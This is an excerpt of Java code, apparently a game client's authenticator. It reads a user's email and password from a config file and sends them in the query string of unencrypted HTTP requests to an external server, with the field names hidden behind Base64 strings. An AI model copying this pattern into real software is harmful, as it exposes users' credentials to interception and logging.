...
public class ClientAuthenticator {
    ...
    public static void auth() {
        ...
        try {
            HttpURLConnection connection = PostRequest.genUnOutCon("http://mcp.antecedentium.xyz/api/authenticate.php?mail=" + configUtils.getJSON().getString(new String(Base64.getDecoder().decode("dQ=="))) + new String(Base64.getDecoder().decode("JnBhc3M9")) + configUtils.getJSON().getString(new String(Base64.getDecoder().decode("cA=="))));
            ...
            HttpURLConnection con2 = PostRequest.genUnOutCon("http://mcp.antecedentium.xyz/authenticate.php?mail=" + configUtils.getJSON().getString(new String(Base64.getDecoder().decode("dQ=="))) + new String(Base64.getDecoder().decode("JnBhc3M9")) + configUtils.getJSON().getString(new String(Base64.getDecoder().decode("cA=="))));
